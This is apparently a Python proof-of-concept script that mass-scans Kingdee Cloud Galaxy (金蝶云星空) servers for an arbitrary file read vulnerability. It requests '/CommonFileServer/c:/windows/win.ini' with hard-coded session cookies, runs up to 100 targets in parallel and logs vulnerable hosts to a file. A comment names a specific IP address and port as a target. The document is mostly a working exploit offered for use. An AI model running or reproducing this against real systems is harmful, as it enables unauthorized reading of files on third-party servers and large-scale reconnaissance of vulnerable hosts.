# # 118.190.151.251:8000
import argparse,requests
from multiprocessing.dummy import Pool
# banner 信息
def banner():
    test = """金蝶云星空"""
    print(test)
def poc(target):
    payload = '/CommonFileServer/c:/windows/win.ini'
    headers = {
    "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding":"gzip,deflate,br",
    "Connection":"keep-alive",
    "Cookie":"ASP.NET_SessionId=tdpsukanhuqwxcb3auscxinp;Theme=standard;kdservice-sessionid=97ed14cb-5e54-4af6-bcf3-ef8aa069fee4",
    "Upgrade-Insecure-Requests":"1",
    "Priority":"u=0,i",
    }
    try:
        res1 = requests.get(url=target)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload, headers=headers,verify=False,timeout=5)
            print(res2.text)
            if '[fonts]' in res2.text:
                with open('金蝶_result_jin.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在任意文件读取漏洞\n")
                print(f"该{target}存在任意文件读取漏洞")
            else:
                print(f"该{target}不存在任意文件读取漏洞")
        else:
            print(f"该{target}可能存在问题,请手工检测")
    except Exception as e:
        print(e)
def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="金蝶云星空任意文件读取漏洞")
    parse.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parse.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误,请使用 python file_name.py -u url ")
if __name__ == '__main__':
    main()